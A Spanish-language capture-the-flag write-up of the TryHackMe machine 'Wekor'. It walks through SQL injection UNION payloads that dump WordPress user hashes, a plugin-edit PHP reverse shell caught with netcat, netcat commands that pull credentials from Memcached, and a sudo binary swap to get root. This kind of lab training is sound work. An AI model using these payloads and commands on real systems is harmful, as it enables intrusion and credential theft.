Wekor | TryHackMe

Published:13 ago 2024 |  at 21:45

Wekor es una máquina de la plataforma TryHackMe con una dificultad media. En esta máquina, se abordan varios temas clave en ciberseguridad, tales como el reconocimiento inicial, la enumeración de directorios, la explotación de vulnerabilidades de SQL Injection (SQLi), el cracking de hashes, y la obtención de una reverse shell. Además, se realiza un escaneo interno de puertos abiertos y se explota el servicio Memcached para elevar privilegios al usuario “Orka”. Finalmente, se realiza una segunda elevación de privilegios a root aprovechando un script ejecutable con permisos específicos.

Reconocimiento

Empezamos como siempre realizando un escaneo de puertos al objetivo y detectamos que el puerto 22 y el 80 se encuentran abiertos.

Revisando la pagina web y buscando sobre las rutas que nmap descubrió mediante el archivo robots.txt encontramos que la pagina web esta desplegada en la ruta /it-next.

Análisis de Vulnerabilidades

Explorando la pagina web encontramos que en el carrito de compras en el apartado Coupon code es vulnerable a inyección SQL, por lo tanto abusaremos de esto para conseguir datos sensibles.

Si aplicamos la siguiente query vemos que no lanza ningun error por lo tanto es vulnerable.

'or 1 = 1-- -

Explotación

Con la siguiente query detectamos que la base de datos en uso solo tiene 3 columnas dado que se muestran los numeros en la respuesta.

'union select 1,2,3-- -

Con la siguiente query se muestran las bases de datos existentes dentro del servidor.

'union select 1,schema_name,3 from information_schema.schemata-- -

Ahora listaremos las tablas de la base de datos wordpress .

'union select 1,table_name,3 from information_schema.tables where table_schema='wordpress'-- -

Con esta query hacemos lo mismo que la anterior solo que el resultado se muestra en una misma linea ya que se hace una concatenación de los datos.

'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='wordpress'-- -

Despues mostramos las columnas de la tabla wp_users con la base de datos wordpress.

'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='wordpress' and table_name='wp_users'-- -

Mostramos los datos de las columnas.

'union select 1,group_concat(user_login,':',user_pass,':',user_nicename,':',user_email,':',user_url,':',user_registered,':',user_activation_key,':',user_status,':',display_name),3 from wordpress.wp_users-- -

Vemos que existe un subdominio site.wekor.thm y procedemos a agregarlo al archivo /etc/hosts.

Hacemos lo mismo que la anterior solo que mostramos unicamente el usuario y la contraseña hasheada.

'union select 1,group_concat(user_login,':',user_pass),3 from wordpress.wp_users-- -

Una vez crackeados los hashes vemos que solo logramos conseguir la de tres usuarios excepto la del admin.

Visitando y explorando la pagina web con el subdominio site.wekor.thm encontramos una pagina que no nos dice nada importante.

Enumerando directorios encontramos el panel de autenticacion http://site.wekor.thm/wp-admin e intentamos acceder con las credenciales anteriormente obtenidas.

Una vez accedimos con el usuario yura procedemos a buscar y editar los plugins para poder conseguir una reverse shell.

Verificamos nuestra IP y editamos nuestro codigo php para la reverse shell.

Nos ponemos a escuchar en el puerto 4444 con netcat.

Activamos el plugin anteriormente editado y esperamos a que se reciba la reverse shell.

Como se muestra en la imagen vemos que funciono correctamente y procedemos a realizar el tratamiento de la tty.

https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

Buscando por los archivos de la pagina web encontramos el usuario y contraseña del servidor de base de datos MySQL.

Escalada de Privilegios

Vemos que tenemos un puerto abierto internamente en la maquina que no es visible desde otras maquinas que es el 11211, buscando por internet encontramos que este puerto corre el servicio Memcache.

https://book.hacktricks.xyz/network-services-pentesting/11211-memcache

Leyendo la documentación vemos que podemos listar la informacion que se encuentra en este servicio con los iguientes comandos.

echo "version" | nc -vn -w 1 127.0.0.1 11211

echo "stats" | nc -vn -w 1 127.0.0.1 11211

echo "stats slabs" | nc -vn -w 1 127.0.0.1 11211

echo "stats items" | nc -vn -w 1 127.0.0.1 11211

echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211

echo "get username" | nc -vn -w 1 127.0.0.1 11211  

echo "get password" | nc -vn -w 1 127.0.0.1 11211

Obtuvimos el usuario y contraseña del usuario Orka.

Elevamos nuestro privilegio con el comando su Orka y colocamos la contraseña.

Encontramos la primera flag del usuario.

Vemos que podemos ejecutar el comando /home/Orka/Desktop/bitcoin con privilegios root sin proporcionar contraseña.

No podemos eliminar los archivos pero si podemos mover la carpeta en donde se encuentran, le cambiamos el nombre a Dev, creamos la carpeta Desktop y creamos el archivo bitcoin nuevamente pero con otras lineas de codigo, le asignamos permisos de ejecución y lo ejecutamos con sudo.

Una vez realizado vemos que hemos elevado nuestro privilegio a root y podemos ver la ultima flag que nos faltaba.
